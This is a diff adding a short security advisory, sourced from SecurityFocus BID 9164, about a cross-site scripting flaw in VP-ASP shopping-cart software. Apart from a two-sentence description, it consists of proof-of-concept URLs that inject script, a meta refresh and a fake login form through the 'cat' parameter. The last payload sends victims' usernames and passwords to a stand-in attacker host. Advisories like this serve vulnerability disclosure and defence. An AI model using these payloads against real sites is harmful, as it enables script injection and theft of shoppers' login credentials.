@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/9164/info
+
+A vulnerability has been reported to exist in VP-ASP software that may allow a remote user to launch cross-site scripting attacks. A remote attacker may exploit this issue to potentially execute HTML or script code in the security context of the vulnerable site. 
+
+http://www.example.com/shopping/shopdisplayproducts.asp?id=1&cat=[XSS Code]
+
+http://www.example.com/shopping/shopdisplayproducts.asp?id=1&cat=<script>alert('test')</script>
+
+http://www.example.com/vpasp/shopdisplayproducts.asp?id=5&cat=<img%20src="javascript:alert('XSS')">
+
+http://www.example.com/vpasp/shopdisplayproducts.asp?id=5&cat=<meta%20http-equiv='refresh'content='0'>
+
+http://www.example.com/vpasp/shopdisplayproducts.asp?id=5&cat=<form%20action="http://www.evilhacker.com/save2db.asp"%20method="post">Username:<input%20name="username"%20type="text"%20maxlength="30"><br>Password:<input%20name="password"%20type="text"%20maxlength="30"><br><input%20name="login"%20type="submit"%20value="Login"></form> 
